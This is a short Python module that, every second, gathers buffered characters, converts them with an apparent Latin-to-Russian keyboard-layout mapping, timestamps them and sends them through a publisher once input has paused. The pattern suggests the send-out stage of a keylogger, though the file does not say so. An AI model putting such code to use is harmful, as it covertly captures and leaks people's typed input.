import time
from datetime import datetime

from apscheduler.schedulers.background import BackgroundScheduler
from pytz import timezone

from suhrob.connection import publisher
from suhrob.settings import DELAY, TIMEZONE
from suhrob.storage import memory
from suhrob.translation import RU

job_defaults = {
    'coalesce': True,
}


scheduler = BackgroundScheduler(job_defaults=job_defaults, timezone=timezone(TIMEZONE))


@scheduler.scheduled_job('interval', seconds=1)
def send_collected_data():
    if time.time() - memory.last < DELAY or not memory.seq:
        return
    collected_data = {
        'en': ''.join(memory.seq),
        'ru': ''.join(map(RU, memory.seq)),
        'date': str(datetime.now(tz=timezone(TIMEZONE))),
    }
    publisher.send(collected_data)
    memory.seq.clear()
